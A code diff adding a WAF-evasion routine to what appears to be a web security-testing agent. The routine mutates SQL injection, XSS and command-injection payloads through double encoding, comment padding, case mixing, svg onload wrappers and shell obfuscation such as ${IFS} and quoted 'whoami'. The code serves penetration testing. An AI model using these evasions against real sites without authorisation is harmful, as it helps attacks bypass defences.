@@ -200,6 +200,34 @@ class WebSecurityAgent(BaseAgent):
         self.logger = logging.getLogger("secagents.web_security")
         self._client: Optional[httpx.AsyncClient] = None
 
+    def mutate_payload_for_waf(self, payload: str, vuln_type: str) -> list[str]:
+        """Generate WAF evasion payload variants via encoding, comment injection, and obfuscation."""
+        mutations = [payload]
+        import urllib.parse
+
+        # 1. URL double encoding
+        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
+        
+        # 2. SQLi specific comment obfuscation
+        if vuln_type == "sqli":
+            mutations.append(payload.replace(" ", "/**/"))
+            mutations.append(payload.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt"))
+            mutations.append(payload.replace("'", "%27"))
+
+        # 3. XSS specific obfuscation
+        elif vuln_type == "xss":
+            mutations.append(payload.replace("<", "%3C").replace(">", "%3E"))
+            mutations.append(payload.replace("alert", "prompt").replace("1", "document.domain"))
+            mutations.append(f"<svg/onload={payload.replace('<script>', '').replace('</script>', '')}>")
+
+        # 4. Command Injection obfuscation
+        elif vuln_type in ("rce", "cmdi"):
+            mutations.append(payload.replace("whoami", "w'h'o'a'm'i"))
+            mutations.append(payload.replace("whoami", "$({a,w}{b,h}{c,o}{d,a}{e,m}{f,i})"))
+            mutations.append(payload.replace(" ", "${IFS}"))
+
+        return list(dict.fromkeys(mutations))
+
     @property
     def client(self) -> httpx.AsyncClient:
         if self._client is None:
